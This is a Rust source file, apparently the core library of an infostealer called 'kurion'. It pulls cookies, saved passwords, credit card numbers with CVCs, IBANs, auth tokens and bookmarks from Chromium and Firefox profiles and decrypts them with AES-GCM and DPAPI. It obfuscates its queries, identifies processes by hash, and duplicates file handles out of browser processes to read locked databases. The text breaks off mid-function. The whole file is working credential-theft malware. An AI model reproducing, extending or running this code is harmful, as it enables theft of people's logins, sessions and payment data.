use kurion_crypto::aes_gcm::AesGcm;
use rusqlite::{Connection, OpenFlags};
use serde::Serialize;
use std::collections::HashMap;
use std::path::{Path, PathBuf};

// main library for kurion
pub(crate) const fn fnv1a(bytes: &[u8]) -> u64 {
    let mut hash: u64 = 0xcbf29ce484222325;
    let mut i = 0;
    while i < bytes.len() {
        hash ^= bytes[i] as u64;
        hash = hash.wrapping_mul(0x100000001b3);
        i += 1;
    }
    hash
}

pub(crate) fn f_by_name(dir: &Path, name: &str) -> Option<PathBuf> {
    let p = dir.join(name);
    if p.exists() { Some(p) } else { None }
}

fn f_files_by_name(dir: &Path, names: &[&'static str]) -> HashMap<&'static str, PathBuf> {
    let mut found = HashMap::new();
    for &name in names {
        let p = dir.join(name);
        if p.exists() { found.insert(name, p); }
    }
    found
}


const GECKO_PROCESS_HASHES: [u64; 5] = [
    0xc741aeb1a6ba56f4,
    0xde3c544add620f5c,
    0x35cbf8b0cbfd547f,
    0xc73d9a9b3996e543,
    0x810242a803cc2339,
];

#[cfg(feature = "extract_socials")]
pub mod socials;

#[cfg(feature = "extract_wallets")]
pub mod wallets;

#[cfg(feature = "extract_games")]
pub mod games;

pub mod file_search;

pub trait ExtractionReporter {
    fn r_profile(&mut self, name: &str);
    fn r_cookies(&mut self, count: usize, total: usize);
    fn r_passwords(&mut self, count: usize);
    fn r_cards(&mut self, count: usize);
    fn r_ibans(&mut self, count: usize);
    fn r_tokens(&mut self, count: usize);
    fn r_bookmarks(&mut self, count: usize);
}

#[derive(Debug, Serialize)]
pub struct Cookie {
    pub host: String,
    pub name: String,
    pub path: String,
    pub is_secure: bool,
    pub is_httponly: bool,
    pub expires: i64,
    pub value: String,
}

#[derive(Debug, Serialize)]
pub struct Password {
    pub url: String,
    pub user: String,
    pub pass: String,
}

#[derive(Debug, Serialize)]
pub struct Card {
    pub name: String,
    pub month: i32,
    pub year: i32,
    pub number: String,
    pub cvc: String,
}

#[derive(Debug, Serialize)]
pub struct Iban {
    pub nickname: String,
    pub iban: String,
}

#[derive(Debug, Serialize)]
pub struct Token {
    pub service: String,
    pub token: String,
    pub binding_key: String,
}

#[derive(Debug, Serialize)]
pub struct Bookmark {
    pub name: String,
    pub url: String,
    pub folder: String,
}

#[derive(Debug, Default)]
pub struct ExtractionStats {
    pub cookies: usize,
    pub passwords: usize,
    pub cards: usize,
    pub ibans: usize,
    pub tokens: usize,
    pub bookmarks: usize,
}

#[cfg(target_os = "windows")]
fn s_locked_database(db_path: &Path) -> Option<Vec<u8>> {
    use std::ffi::c_void;
    use std::ptr;
    use windows::Win32::Foundation::{HANDLE, CloseHandle, NTSTATUS};
    use windows::Win32::System::Diagnostics::ToolHelp::*;
    use windows::core::PCWSTR;

    const SYSTEM_EXTENDED_HANDLE_INFORMATION: u32 = 64;
    const OBJECT_NAME_INFORMATION: u32 = 1;
    const DUPLICATE_SAME_ACCESS: u32 = 0x00000002;
    const FILE_STANDARD_INFORMATION_CLASS: u32 = 5;
    const STATUS_INFO_LENGTH_MISMATCH: u32 = 0xC0000004;
    const STATUS_PENDING: i32 = 0x00000103;
    const MAX_FILE_SIZE: i64 = 100 * 1024 * 1024;
    const HANDLE_BUFFER_SIZE: usize = 32 * 1024 * 1024;

    #[repr(C)]
    struct HandleEntryEx {
        object: *mut c_void,
        unique_process_id: usize,
        handle_value: usize,
        granted_access: u32,
        creator_back_trace_index: u16,
        object_type_index: u16,
        handle_attributes: u32,
        reserved: u32,
    }

    #[repr(C)]
    struct HandleInfoEx {
        number_of_handles: usize,
        reserved: usize,
    }

    #[repr(C)]
    struct UnicodeString {
        length: u16,
        maximum_length: u16,
        _pad: u32,
        buffer: *mut u16,
    }

    #[repr(C)]
    struct IoStatusBlock {
        status: usize,
        information: usize,
    }

    #[repr(C)]
    struct FileStdInfo {
        allocation_size: i64,
        end_of_file: i64,
        number_of_links: u32,
        delete_pending: u8,
        directory: u8,
    }

    type NtQuerySysFn = unsafe extern "system" fn(u32, *mut c_void, u32, *mut u32) -> NTSTATUS;
    type NtDupObjFn = unsafe extern "system" fn(HANDLE, HANDLE, HANDLE, *mut HANDLE, u32, u32, u32) -> NTSTATUS;
    type NtQueryObjFn = unsafe extern "system" fn(HANDLE, u32, *mut c_void, u32, *mut u32) -> NTSTATUS;
    type NtReadFileFn = unsafe extern "system" fn(HANDLE, HANDLE, *const c_void, *const c_void, *mut IoStatusBlock, *mut u8, u32, *const i64, *const u32) -> NTSTATUS;
    type NtQueryInfoFileFn = unsafe extern "system" fn(HANDLE, *mut IoStatusBlock, *mut c_void, u32, u32) -> NTSTATUS;

    #[link(name = "kernel32")]
    extern "system" {
        fn WaitForSingleObject(handle: *mut c_void, ms: u32) -> u32;
    }

    fn q_object_name(nt_query_obj_ptr: usize, handle_val: usize) -> Option<String> {
        let (tx, rx) = std::sync::mpsc::channel();

        std::thread::spawn(move || {
            unsafe {
                let nt_query_obj: NtQueryObjFn = std::mem::transmute(nt_query_obj_ptr);
                let handle = HANDLE(handle_val as *mut c_void);
                let mut buffer = vec![0u8; 1024];
                let mut result_len: u32 = 0;
                let status = nt_query_obj(
                    handle, OBJECT_NAME_INFORMATION,
                    buffer.as_mut_ptr() as _, buffer.len() as u32, &mut result_len,
                );
                if status.0 == 0 {
                    let uni = &*(buffer.as_ptr() as *const UnicodeString);
                    if uni.length > 0 && !uni.buffer.is_null() {
                        let name = String::from_utf16_lossy(
                            std::slice::from_raw_parts(uni.buffer, (uni.length / 2) as usize)
                        );
                        let _ = tx.send(Some(name));
                        return;
                    }
                }
                let _ = tx.send(None);
            }
        });

        rx.recv_timeout(std::time::Duration::from_millis(100)).ok().flatten()
    }

    // noone would read this source to, so better to not refac
    unsafe {
        let ntdll_name: Vec<u16> = "ntdll.dll\0".encode_utf16().collect();
        let ntdll = windows::Win32::System::LibraryLoader::GetModuleHandleW(
            PCWSTR::from_raw(ntdll_name.as_ptr())
        ).ok()?;

        macro_rules! nt_resolve {
            ($name:literal) => {
                std::mem::transmute(windows::Win32::System::LibraryLoader::GetProcAddress(
                    ntdll, windows::core::PCSTR::from_raw(concat!($name, "\0").as_ptr())
                )?)
            }
        }

        let nt_query_sys: NtQuerySysFn = nt_resolve!("NtQuerySystemInformation");
        let nt_dup_obj: NtDupObjFn = nt_resolve!("NtDuplicateObject");
        let nt_query_obj: NtQueryObjFn = nt_resolve!("NtQueryObject");
        let nt_read_file: NtReadFileFn = nt_resolve!("NtReadFile");
        let nt_query_info_file: NtQueryInfoFileFn = nt_resolve!("NtQueryInformationFile");

        let db_path_str = db_path.to_str()?.to_lowercase();
        let marker = "\\user data\\";
        let suffix_pos = db_path_str.find(marker)?;
        let target_suffix = &db_path_str[suffix_pos..];

        let mut my_exe = [0u16; 260];
        windows::Win32::System::LibraryLoader::GetModuleFileNameW(None, &mut my_exe);
        let my_exe_str = String::from_utf16_lossy(
            &my_exe[..my_exe.iter().position(|&c| c == 0).unwrap_or(0)]
        );
        let my_exe_name = std::path::Path::new(&my_exe_str)
            .file_name().and_then(|n| n.to_str()).unwrap_or("").to_lowercase();

        let mut browser_pids: Vec<u32> = Vec::new();
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0).ok()?;
        let mut entry = PROCESSENTRY32W {
            dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32, ..Default::default()
        };
        if Process32FirstW(snapshot, &mut entry).is_ok() {
            loop {
                let name = String::from_utf16_lossy(
                    &entry.szExeFile[..entry.szExeFile.iter().position(|&c| c == 0)
                        .unwrap_or(entry.szExeFile.len())]
                );
                if name.to_lowercase() == my_exe_name {
                    browser_pids.push(entry.th32ProcessID);
                }
                if Process32NextW(snapshot, &mut entry).is_err() { break; }
            }
        }
        let _ = CloseHandle(snapshot);
        if browser_pids.is_empty() { return None; }

        let my_pid = windows::Win32::System::Threading::GetCurrentProcessId();
        let current_process = windows::Win32::System::Threading::GetCurrentProcess();
        let nt_query_obj_ptr = nt_query_obj as usize;

        for attempt in 0..5u32 {
            if attempt > 0 {
                std::thread::sleep(std::time::Duration::from_millis(800));
            }

            let mut buffer: Vec<u8> = vec![0u8; HANDLE_BUFFER_SIZE];
            let mut needed: u32 = 0;
            let mut status = nt_query_sys(
                SYSTEM_EXTENDED_HANDLE_INFORMATION,
                buffer.as_mut_ptr() as _, buffer.len() as u32, &mut needed,
            );
            if status.0 as u32 == STATUS_INFO_LENGTH_MISMATCH {
                buffer.resize(needed as usize + 8192, 0);
                status = nt_query_sys(
                    SYSTEM_EXTENDED_HANDLE_INFORMATION,
                    buffer.as_mut_ptr() as _, buffer.len() as u32, &mut needed,
                );
            }
            if status.0 != 0 { continue; }

            let info = &*(buffer.as_ptr() as *const HandleInfoEx);
            let entries_ptr = buffer.as_ptr()
                .add(std::mem::size_of::<HandleInfoEx>()) as *const HandleEntryEx;

            let mut candidates: Vec<(u32, usize)> = Vec::new();
            for i in 0..info.number_of_handles {
                let h = &*entries_ptr.add(i);
                let pid = h.unique_process_id as u32;
                if pid != my_pid && browser_pids.contains(&pid) {
                    candidates.push((pid, h.handle_value));
                }
            }

            let mut proc_handles: HashMap<u32, HANDLE> = HashMap::new();
            let mut found_data: Option<Vec<u8>> = None;

            for &(pid, handle_val) in &candidates {
                if found_data.is_some() { break; }

                let h_proc = match proc_handles.get(&pid) {
                    Some(&h) => h,
                    None => {
                        match windows::Win32::System::Threading::OpenProcess(
                            windows::Win32::System::Threading::PROCESS_DUP_HANDLE,
                            false, pid,
                        ) {
                            Ok(h) => { proc_handles.insert(pid, h); h }
                            Err(_) => continue,
                        }
                    }
                };

                let mut h_dup = HANDLE(ptr::null_mut());
                if nt_dup_obj(
                    h_proc, HANDLE(handle_val as *mut c_void),
                    current_process, &mut h_dup,
                    0, 0, DUPLICATE_SAME_ACCESS,
                ).0 != 0 || h_dup.0.is_null() {
                    continue;
                }

                let name = match q_object_name(nt_query_obj_ptr, h_dup.0 as usize) {
                    Some(n) => n,
                    None => { let _ = CloseHandle(h_dup); continue; }
                };

                let name_lower = name.to_lowercase();
                let matched = name_lower.find(marker)
                    .map(|pos| name_lower[pos..] == *target_suffix)
                    .unwrap_or(false);

                if !matched {
                    let _ = CloseHandle(h_dup);
                    continue;
                }

                let mut io = IoStatusBlock { status: 0, information: 0 };
                let mut file_info = FileStdInfo {
                    allocation_size: 0, end_of_file: 0,
                    number_of_links: 0, delete_pending: 0, directory: 0,
                };
                let qs = nt_query_info_file(
                    h_dup, &mut io,
                    &mut file_info as *mut _ as *mut c_void,
                    std::mem::size_of::<FileStdInfo>() as u32,
                    FILE_STANDARD_INFORMATION_CLASS,
                );

                if qs.0 != 0 || file_info.end_of_file <= 0 || file_info.end_of_file > MAX_FILE_SIZE {
                    let _ = CloseHandle(h_dup);
                    continue;
                }

                let size = file_info.end_of_file as usize;
                let mut data = vec![0u8; size];
                let mut read_io = IoStatusBlock { status: 0, information: 0 };
                let offset: i64 = 0;
                let read_status = nt_read_file(
                    h_dup, HANDLE(ptr::null_mut()),
                    ptr::null(), ptr::null(),
                    &mut read_io,
                    data.as_mut_ptr(), size as u32,
                    &offset, ptr::null(),
                );

                let final_status = if read_status.0 == STATUS_PENDING {
                    WaitForSingleObject(h_dup.0, 5000);
                    NTSTATUS(read_io.status as i32)
                } else {
                    read_status
                };

                let _ = CloseHandle(h_dup);

                if final_status.0 >= 0 && read_io.information > 0 {
                    data.truncate(read_io.information);
                    found_data = Some(data);
                }
            }

            for (_, h) in &proc_handles {
                let _ = CloseHandle(*h);
            }

            if found_data.is_some() {
                return found_data;
            }
        }

        None
    }
}

pub struct DataExtractor<'a, R: ExtractionReporter> {
    key: Vec<u8>,
    output_base: PathBuf,
    reporter: &'a mut R,
    temp_files: Vec<PathBuf>,
}

impl<'a, R: ExtractionReporter> DataExtractor<'a, R> {
    pub fn new(key: Vec<u8>, output_base: PathBuf, reporter: &'a mut R) -> Self {
        Self { 
            key, 
            output_base, 
            reporter,
            temp_files: Vec::new(),
        }
    }

    pub fn p_profile(&mut self, profile_path: &Path, browser_name: &str, engine_type: &str) -> ExtractionStats {
        let profile_name = profile_path.file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("Unknown");

        self.reporter.r_profile(profile_name);

        let out_dir = self.output_base
            .join("Browser")
            .join(engine_type)
            .join(browser_name)
            .join(profile_name);
        let _ = std::fs::create_dir_all(&out_dir);

        let mut stats = ExtractionStats::default();

        if engine_type == "Gecko" {
            let gecko_targets: &[&'static str] = &["cookies.sqlite", "key4.db", "logins.json", "logins.db", "places.sqlite"];
            let found = f_files_by_name(profile_path, gecko_targets);

            #[cfg(feature = "extract_cookies")]
            {
                if let Some(cookies_db) = found.get("cookies.sqlite") {
                    if let Some(conn) = self.o_database_with_copy(cookies_db) {
                        stats.cookies = self.e_gecko_cookies(&conn, &out_dir.join("cookies.json"));
                    }
                }
            }

            #[cfg(feature = "extract_passwords")]
            {
                let key4_path = found.get("key4.db");

                if let (Some(logins_json), Some(key4)) = (found.get("logins.json"), key4_path) {
                        stats.passwords = self.e_gecko_passwords(logins_json, key4, &out_dir.join("passwords.txt"));
                }

                if stats.passwords == 0 {
                    if let (Some(logins_db), Some(key4)) = (found.get("logins.db"), key4_path) {
                        if let Some(conn) = self.o_database_with_copy(logins_db) {
                            stats.passwords = self.e_gecko_passwords_from_db(&conn, key4, &out_dir.join("passwords.txt"));
                        }
                    }
                }
            }

            #[cfg(feature = "extract_bookmarks")]
            {
                if let Some(places_db) = found.get("places.sqlite") {
                    if let Some(conn) = self.o_database_with_copy(places_db) {
                        stats.bookmarks = self.e_gecko_bookmarks(&conn, &out_dir.join("bookmarks.json"));
                    }
                }
            }
        } else {
            let chromium_targets: &[&'static str] = &["Network", "Login Data", "Login Data For Account", "Web Data", "Bookmarks"];
            let found = f_files_by_name(profile_path, chromium_targets);

            #[cfg(feature = "extract_cookies")]
            {
                if let Some(network_dir) = found.get("Network") {
                    if let Some(cookies_db) = f_by_name(network_dir, "Cookies") {
                        if let Some(conn) = self.o_database_with_copy(&cookies_db) {
                            stats.cookies = self.e_cookies(&conn, &out_dir.join("cookies.json"));
                        }
                    }
                }
            }

            #[cfg(feature = "extract_passwords")]
            {
                if let Some(login_path) = found.get("Login Data") {
                    if let Some(conn) = self.o_database_with_copy(login_path) {
                        stats.passwords += self.e_passwords(&conn, &out_dir.join("passwords.txt"));
                    }
                }

                if let Some(login_account_path) = found.get("Login Data For Account") {
                    if let Some(conn) = self.o_database_with_copy(login_account_path) {
                        stats.passwords += self.e_passwords(&conn, &out_dir.join("passwords_account.txt"));
                    }
                }
            }

            if let Some(web_data_path) = found.get("Web Data") {
                if let Some(conn) = self.o_database_with_copy(web_data_path) {
                    #[cfg(feature = "extract_cards")]
                    {
                        stats.cards = self.e_cards(&conn, &out_dir.join("cards.txt"));
                    }
                    #[cfg(feature = "extract_ibans")]
                    {
                        stats.ibans = self.e_ibans(&conn, &out_dir.join("ibans.json"));
                    }
                    #[cfg(feature = "extract_tokens")]
                    {
                        stats.tokens = self.e_tokens(&conn, &out_dir.join("tokens.json"));
                    }
                }
            }

            #[cfg(feature = "extract_bookmarks")]
            {
                if let Some(bookmarks_path) = found.get("Bookmarks") {
                    stats.bookmarks = self.e_chromium_bookmarks(bookmarks_path, &out_dir.join("bookmarks.json"));
                }
            }
        }

        self.c_temp_files();
        stats
    }

    fn o_database_with_copy(&mut self, db_path: &Path) -> Option<Connection> {
        let uri = format!("file:{}?nolock=1", db_path.display());
        if let Ok(conn) = Connection::open_with_flags(
            &uri,
            OpenFlags::SQLITE_OPEN_READ_ONLY | OpenFlags::SQLITE_OPEN_URI | OpenFlags::SQLITE_OPEN_NO_MUTEX
        ) {
            if conn.prepare("SELECT 1").is_ok() {
                return Some(conn);
            }
        }

        if let Ok(conn) = Connection::open_with_flags(
            db_path,
            OpenFlags::SQLITE_OPEN_READ_ONLY | OpenFlags::SQLITE_OPEN_NO_MUTEX
        ) {
            if conn.prepare("SELECT 1").is_ok() {
                return Some(conn);
            }
        }

        let temp_dir = self.output_base.join(".temp");
        let _ = std::fs::create_dir_all(&temp_dir);
        let db_name = db_path.file_name().and_then(|n| n.to_str()).unwrap_or("db");
        let temp_path = temp_dir.join(format!("{}.tmp", db_name));

        if std::fs::copy(db_path, &temp_path).is_ok() {
            if let Some(parent) = db_path.parent() {
                let wal_path = parent.join(format!("{}-wal", db_name));
                let shm_path = parent.join(format!("{}-shm", db_name));

                if wal_path.exists() {
                    let temp_wal = temp_dir.join(format!("{}.tmp-wal", db_name));
                    let _ = std::fs::copy(&wal_path, &temp_wal);
                    self.temp_files.push(temp_wal);
                }

                if shm_path.exists() {
                    let temp_shm = temp_dir.join(format!("{}.tmp-shm", db_name));
                    let _ = std::fs::copy(&shm_path, &temp_shm);
                    self.temp_files.push(temp_shm);
                }
            }

            self.temp_files.push(temp_path.clone());
            let temp_uri = format!("file:{}?nolock=1", temp_path.display());
            if let Ok(conn) = Connection::open_with_flags(
                &temp_uri,
                OpenFlags::SQLITE_OPEN_READ_ONLY | OpenFlags::SQLITE_OPEN_URI
            ) {
                return Some(conn);
            }
            if let Ok(conn) = Connection::open_with_flags(&temp_path, OpenFlags::SQLITE_OPEN_READ_ONLY) {
                return Some(conn);
            }
        }

        #[cfg(target_os = "windows")]
        {
            let stolen = s_locked_database(db_path);
            if let Some(db_data) = stolen {
                let stolen_temp = temp_dir.join(format!("{}.stolen.tmp", db_name));
                if std::fs::write(&stolen_temp, &db_data).is_ok() {
                    self.temp_files.push(stolen_temp.clone());
                    if let Ok(conn) = Connection::open_with_flags(&stolen_temp, OpenFlags::SQLITE_OPEN_READ_ONLY) {
                        if conn.prepare("SELECT 1").is_ok() {
                            return Some(conn);
                        }
                    }
                }
            }
        }

        #[cfg(target_os = "windows")]
        {
            use crate::socials::d_database_from_memory;

            for &process_hash in &GECKO_PROCESS_HASHES {
                if let Some(db_data) = d_database_from_memory(process_hash) {
                    let dumped_temp = temp_dir.join(format!("{}.dumped.tmp", db_name));
                    if std::fs::write(&dumped_temp, &db_data).is_ok() {
                        self.temp_files.push(dumped_temp.clone());
                        if let Ok(conn) = Connection::open_with_flags(&dumped_temp, OpenFlags::SQLITE_OPEN_READ_ONLY) {
                            if conn.prepare("SELECT 1").is_ok() {
                                return Some(conn);
                            }
                        }
                    }
                }
            }
        }

        None
    }

    fn c_temp_files(&mut self) {
        for temp_file in &self.temp_files {
            let _ = std::fs::remove_file(temp_file);
        }
        self.temp_files.clear();
        
        let temp_dir = self.output_base.join(".temp");
        if temp_dir.exists() {
            let _ = std::fs::remove_dir(&temp_dir);
        }
    }

    #[cfg(feature = "extract_cookies")]
    fn e_cookies(&mut self, conn: &Connection, out_file: &Path) -> usize {
        let query = obfstr::obfstr!("SELECT host_key, name, path, is_secure, is_httponly, expires_utc, encrypted_value FROM cookies").to_string();
        
        let mut stmt = match conn.prepare(&query) {
            Ok(s) => s,
            Err(_) => return 0,
        };

        let mut cookies = Vec::new();
        let mut total = 0;

        let rows = stmt.query_map([], |row| {
            Ok((
                row.get::<_, String>(0)?,
                row.get::<_, String>(1)?,
                row.get::<_, String>(2)?,
                row.get::<_, i32>(3)?,
                row.get::<_, i32>(4)?,
                row.get::<_, i64>(5)?,
                row.get::<_, Vec<u8>>(6)?,
            ))
        });

        if let Ok(iter) = rows {
            for result in iter.flatten() {
                total += 1;
                let (host, name, path, is_secure, is_httponly, expires_utc, encrypted) = result;

                let value = if let Some(decrypted) = AesGcm::decrypt(&self.key, &encrypted) {
                    if encrypted.starts_with(b"v20") && decrypted.len() > 32 {
                        String::from_utf8_lossy(&decrypted[32..]).to_string()
                    } else {
                        String::from_utf8_lossy(&decrypted).to_string()
                    }
                } else if let Ok(dec) = kurion_crypto::dpapi::u_data(&encrypted) {
                    String::from_utf8_lossy(&dec).to_string()
                } else {
                    continue;
                };

                cookies.push(Cookie {
                    host,
                    name,
                    path,
                    is_secure: is_secure != 0,
                    is_httponly: is_httponly != 0,
                    expires: expires_utc,
                    value,
                });
            }
        }

        if !cookies.is_empty() {
             if let Some(parent) = out_file.parent() {
                 let _ = std::fs::create_dir_all(parent);
             }
             if let Ok(json) = serde_json::to_string_pretty(&cookies) {
                 let _ = std::fs::write(out_file, json);
             }
             self.reporter.r_cookies(cookies.len(), total);
        }

        cookies.len()
    }

    #[cfg(feature = "extract_passwords")]
    fn e_passwords(&mut self, conn: &Connection, out_file: &Path) -> usize {
        let query = obfstr::obfstr!("SELECT origin_url, username_value, password_value FROM logins").to_string();
        
        let mut stmt = match conn.prepare(&query) {
            Ok(s) => s,
            Err(_) => return 0,
        };

        let mut passwords = Vec::new();

        let rows = stmt.query_map([], |row| {
            Ok((
                row.get::<_, String>(0)?,
                row.get::<_, String>(1)?,
                row.get::<_, Vec<u8>>(2)?,
            ))
        });

        if let Ok(iter) = rows {
            for result in iter.flatten() {
                let (url, user, encrypted) = result;

                let pass = if let Some(decrypted) = AesGcm::decrypt(&self.key, &encrypted) {
                    String::from_utf8_lossy(&decrypted).to_string()
                } else if let Ok(dec) = kurion_crypto::dpapi::u_data(&encrypted) {
                     String::from_utf8_lossy(&dec).to_string()
                } else {
                     continue;
                };

                passwords.push(Password { url, user, pass });
            }
        }

        if !passwords.is_empty() {
            if let Some(parent) = out_file.parent() {
                let _ = std::fs::create_dir_all(parent);
            }
            let mut text = String::new();
            for p in &passwords {
                text.push_str(&format!("URL: {}\nUser: {}\nPassword: {}\n-------------------------------\n",
                    p.url, p.user, p.pass));
            }
            let _ = std::fs::write(out_file, &text);
            self.reporter.r_passwords(passwords.len());
        }

        passwords.len()
    }

    #[cfg(feature = "extract_cards")]
    fn e_cards(&mut self, conn: &Connection, out_file: &Path) -> usize {
        let mut cvc_map: HashMap<String, String> = HashMap::new();
        if let Ok(mut stmt) = conn.prepare(obfstr::obfstr!("SELECT guid, value_encrypted FROM local_stored_cvc")) {
            let rows = stmt.query_map([], |row| {
                Ok((
                    row.get::<_, String>(0)?,
                    row.get::<_, Vec<u8>>(1)?,
                ))
            });
            if let Ok(iter) = rows {
                for result in iter.flatten() {
                    let (guid, encrypted) = result;
                    let decrypted_opt = AesGcm::decrypt(&self.key, &encrypted)
                        .or_else(|| kurion_crypto::dpapi::u_data(&encrypted).ok());
                        
                    if let Some(decrypted) = decrypted_opt {
                        cvc_map.insert(guid, String::from_utf8_lossy(&decrypted).to_string());
                    }
                }
            }
        }

        let query = obfstr::obfstr!("SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").to_string();
        let mut stmt = match conn.prepare(&query) {
            Ok(s) => s,
            Err(_) => return 0,
        };

        let mut cards = Vec::new();

        let rows = stmt.query_map([], |row| {
            Ok((
                row.get::<_, String>(0)?,
                row.get::<_, String>(1)?,
                row.get::<_, i32>(2)?,
                row.get::<_, i32>(3)?,
                row.get::<_, Vec<u8>>(4)?,
            ))
        });

        if let Ok(iter) = rows {
            for result in iter.flatten() {
                let (guid, name, month, year, encrypted) = result;
                
                let decrypted_opt = AesGcm::decrypt(&self.key, &encrypted)
                    .or_else(|| kurion_crypto::dpapi::u_data(&encrypted).ok());

                if let Some(decrypted) = decrypted_opt {
                    let number = String::from_utf8_lossy(&decrypted).to_string();
                    let cvc = cvc_map.get(&guid).cloned().unwrap_or_default();
                    cards.push(Card { name, month, year, number, cvc });
                }
            }
        }

        if !cards.is_empty() {
            if let Some(parent) = out_file.parent() {
                let _ = std::fs::create_dir_all(parent);
            }
            let mut text = String::new();
            for c in &cards {
                text.push_str(&format!("Name: {}\nNumber: {}\nCVC: {}\nMonth: {}\nYear: {}\n------------------------------\n",
                    c.name, c.number, c.cvc, c.month, c.year));
            }
            let _ = std::fs::write(out_file, &text);
            self.reporter.r_cards(cards.len());
        }

        cards.len()
    }

    #[cfg(feature = "extract_ibans")]
    fn e_ibans(&mut self, conn: &Connection, out_file: &Path) -> usize {
        let query = obfstr::obfstr!("SELECT value_encrypted, nickname FROM local_ibans").to_string();
        let mut stmt = match conn.prepare(&query) {
            Ok(s) => s,
            Err(_) => return 0,
        };

        let mut ibans = Vec::new();

        let rows = stmt.query_map([], |row| {
            Ok((
                row.get::<_, Vec<u8>>(0)?,
                row.get::<_, String>(1)?,
            ))
        });

        if let Ok(iter) = rows {
            for result in iter.flatten() {
                let (encrypted, nickname) = result;
                
                let decrypted_opt = AesGcm::decrypt(&self.key, &encrypted)
                    .or_else(|| kurion_crypto::dpapi::u_data(&encrypted).ok());

                if let Some(decrypted) = decrypted_opt {
                    let iban = String::from_utf8_lossy(&decrypted).to_string();
                    ibans.push(Iban { nickname, iban });
                }
            }
        }

        if !ibans.is_empty() {
            if let Some(parent) = out_file.parent() {
                let _ = std::fs::create_dir_all(parent);
            }
            if let Ok(json) = serde_json::to_string_pretty(&ibans) {
                let _ = std::fs::write(out_file, json);
            }
            self.reporter.r_ibans(ibans.len());
        }

        ibans.len()
    }

    #[cfg(feature = "extract_tokens")]
    fn e_tokens(&mut self, conn: &Connection, out_file: &Path) -> usize {
        let q_full = obfstr::obfstr!("SELECT service, encrypted_token, binding_key FROM token_service").to_string();
        let q_short = obfstr::obfstr!("SELECT service, encrypted_token FROM token_service").to_string();
        let (query, has_binding_key) = if conn.prepare(&q_full).is_ok() {
            (q_full, true)
        } else {
            (q_short, false)
        };

        let mut stmt = match conn.prepare(&query) {
            Ok(s) => s,
            Err(_) => return 0,
        };

        let mut tokens = Vec::new();

        if has_binding_key {
            let rows = stmt.query_map([], |row| {
                Ok((
                    row.get::<_, String>(0)?,
                    row.get::<_, Vec<u8>>(1)?,
                    row.get::<_, Vec<u8>>(2).ok(),
                ))
            });

            if let Ok(iter) = rows {
                for result in iter.flatten() {
                    let (service, encrypted, binding_key_enc) = result;
                    
                    let decrypted_opt = AesGcm::decrypt(&self.key, &encrypted)
                         .or_else(|| kurion_crypto::dpapi::u_data(&encrypted).ok());

                    if let Some(decrypted) = decrypted_opt {
                        let token = String::from_utf8_lossy(&decrypted).to_string();
                        
                        let mut binding_key = String::new();
                        if let Some(enc) = binding_key_enc {
                            let bk_dec_opt = AesGcm::decrypt(&self.key, &enc)
                                .or_else(|| kurion_crypto::dpapi::u_data(&enc).ok());
                            if let Some(bk) = bk_dec_opt {
                                binding_key = String::from_utf8_lossy(&bk).to_string();
                            }
                        }
                        
                        tokens.push(Token { service, token, binding_key });
                    }
                }
            }
        } else {
            let rows = stmt.query_map([], |row| {
                Ok((
                    row.get::<_, String>(0)?,
                    row.get::<_, Vec<u8>>(1)?,
                ))
            });

            if let Ok(iter) = rows {
                for result in iter.flatten() {
                    let (service, encrypted) = result;

                    let decrypted_opt = AesGcm::decrypt(&self.key, &encrypted)
                         .or_else(|| kurion_crypto::dpapi::u_data(&encrypted).ok());

                    if let Some(decrypted) = decrypted_opt {
                        let token = String::from_utf8_lossy(&decrypted).to_string();
                        tokens.push(Token { service, token, binding_key: String::new() });
                    }
                }
            }
        }

        if !tokens.is_empty() {
             if let Some(parent) = out_file.parent() {
                 let _ = std::fs::create_dir_all(parent);
             }
             if let Ok(json) = serde_json::to_string_pretty(&tokens) {
                 let _ = std::fs::write(out_file, json);
             }
             self.reporter.r_tokens(tokens.len());
        }

        tokens.len()
    }

    #[cfg(feature = "extract_bookmarks")]
    fn e_chromium_bookmarks(&mut self, bookmarks_path: &Path, out_file: &Path) -> usize {
        use serde_json::Value;

        let bookmarks_data = match std::fs::read_to_string(bookmarks_path) {
            Ok(data) => data,
            Err(_) => return 0,
        };

        let bookmarks_json: Value = match serde_json::from_str(&bookmarks_data) {
            Ok(json) => json,
            Err(_) => return 0,
        };

        let mut bookmarks = Vec::new();

        if let Some(roots) = bookmarks_json.get("roots") {
            if let Some(bookmark_bar) = roots.get("bookmark_bar") {
                Self::e_bookmark_folder(bookmark_bar, "Bookmarks Bar", &mut bookmarks);
            }

            if let Some(other) = roots.get("other") {
                Self::e_bookmark_folder(other, "Other Bookmarks", &mut bookmarks);
            }

            if let Some(synced) = roots.get("synced") {
                Self::e_bookmark_folder(synced, "Mobile Bookmarks", &mut bookmarks);
            }
        }

        if !bookmarks.is_empty() {
            if let Some(parent) = out_file.parent() {
                let _ = std::fs::create_dir_all(parent);
            }
            if let Ok(json) = serde_json::to_string_pretty(&bookmarks) {
                let _ = std::fs::write(out_file, json);
            }
            self.reporter.r_bookmarks(bookmarks.len());
        }

        bookmarks.len()
    }

    fn e_bookmark_folder(folder: &serde_json::Value, folder_path: &str, bookmarks: &mut Vec<Bookmark>) {
        if let Some(children) = folder.get("children").and_then(|c| c.as_array()) {
            for child in children {
                let bookmark_type = child.get("type").and_then(|t| t.as_str()).unwrap_or("");

                if bookmark_type == "url" {
                    let name = child.get("name").and_then(|n| n.as_str()).unwrap_or("").to_string();
                    let url = child.get("url").and_then(|u| u.as_str()).unwrap_or("").to_string();

                    if !url.is_empty() {
                        bookmarks.push(Bookmark {
                            name,
                            url,
                            folder: folder_path.to_string(),
                        });
                    }
                } else if bookmark_type == "folder" {
                    let folder_name = child.get("name").and_then(|n| n.as_str()).unwrap_or("");
                    let new_path = if folder_path.is_empty() {
                        folder_name.to_string()
                    } else {
                        format!("{}/{}", folder_path, folder_name)
                    };
                    Self::e_bookmark_folder(child, &new_path, bookmarks);
                }
            }
        }
    }

    #[cfg(feature = "extract_cookies")]
    fn e_gecko_cookies(&mut self, conn: &Connection, out_file: &Path) -> usize {
        let query = obfstr::obfstr!("SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies").to_string();

        let mut stmt = match conn.prepare(&query) {
            Ok(s) => s,
            Err(_) => return 0,
        };

        let mut cookies = Vec::new();
        let mut total = 0;

        let rows = stmt.query_map([], |row| {
            Ok((
                row.get::<_, String>(0)?,
